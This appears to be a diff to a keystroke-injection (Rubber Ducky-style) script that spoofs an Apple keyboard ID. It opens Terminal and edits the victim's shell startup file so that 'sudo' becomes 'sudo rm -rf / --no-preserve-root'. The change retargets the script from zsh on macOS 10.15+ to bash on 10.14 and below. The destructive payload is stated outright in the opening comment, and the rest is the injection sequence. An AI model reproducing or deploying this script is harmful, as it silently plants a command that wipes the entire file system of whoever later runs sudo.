@@ -1,5 +1,5 @@
 REM Changes sudo to 'sudo rm -rf / --no-preserve-root'
-REM Target OSx 10.15+
+REM Target OSx 10.14 and below
 ID 05ac:021e Apple:Keyboard
 DELAY 500
 COMMAND SPACE
@@ -8,7 +8,7 @@ STRING terminal.app
 DELAY 300
 ENTER
 DELAY 1000
-STRING nano ~/.zshrc
+STRING nano ~/.bashrc
 DELAY 500
 CTRL w
 DELAY 150
